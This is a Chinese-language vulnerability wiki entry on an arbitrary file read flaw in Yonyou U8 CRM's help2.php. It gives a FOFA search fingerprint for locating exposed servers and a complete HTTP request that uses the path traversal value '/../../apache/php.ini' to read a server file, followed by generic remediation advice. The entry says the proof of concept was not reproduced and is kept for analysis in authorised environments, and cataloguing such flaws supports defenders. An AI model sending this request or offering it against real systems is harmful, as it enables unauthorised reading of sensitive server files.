---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "用友U8 CRM help2 key路径读取"
product: "用友U8 CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "路径布局apache/php.ini；版本未知"
prerequisites: "提供PHPSESSID，鉴权未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BU8/%E7%94%A8%E5%8F%8B%20U8%20CRM%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"用友U8CRM\""
fofa_unverified: "body="
id: "vw-7d5193a68aa634640c2b467f"
entity_id: "ve-7d5193a68aa634640c2b467f"
schema_version: "1"
---

# 用友U8 CRM help2 key路径读取

## 条目说明

- 对象与具体问题：用友U8 CRM；help2 key路径读取
- 版本、配置及部署条件：路径布局apache/php.ini；版本未知
- 认证与权限前提：提供PHPSESSID，鉴权未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 请求含Cookie不能据泛化文案判匿名；无结果/基线证据
- 官方修复标题下无具体公告，只一般建议

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

用友 U8 CRM是一款综合性的客户关系管理软件，旨在帮助企业建立和维护与客户之间的良好关系。它提供了全面的功能，包括销售管理、市场营销、客户服务和分析报告等。该系统支持多种行业和企业规模，并具有灵活可定制的特点，可以根据企业的需求进行个性化配置。该CRM系统软件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中敏感文件。

## 影响范围

用友 U8 CRM客户关系管理系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | [已公开] | [已公开] | [已知] |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 【高危】 |
| 影响面 | 【广】 |
| 攻击者价值 | 【中】 |
| 利用难度 | 【低】 |

## 漏洞复现

FOFA：body="用友U8CRM"

POC/EXP：

```http
GET /pub/help2.php?key=/../../apache/php.ini HTTP/1.1
Host: 127.0.0.1:8072
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=b************************7
Connection: close
```


## 修复方案

**官方修复：**

1、检查用户输入：在处理用户输入时，应该对输入进行严格的验证和过滤，避免让恶意输入通过应用程序。

2、配置文件权限：在服务器上设置文件和目录的权限，确保只有授权的用户才能够读取敏感的文件。

3、使用白名单：为了防止攻击者尝试读取任意文件，可以使用白名单机制来限制应用程序可以访问的文件列表。

4、具体修复方法请关注用友官方修改补丁为准。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
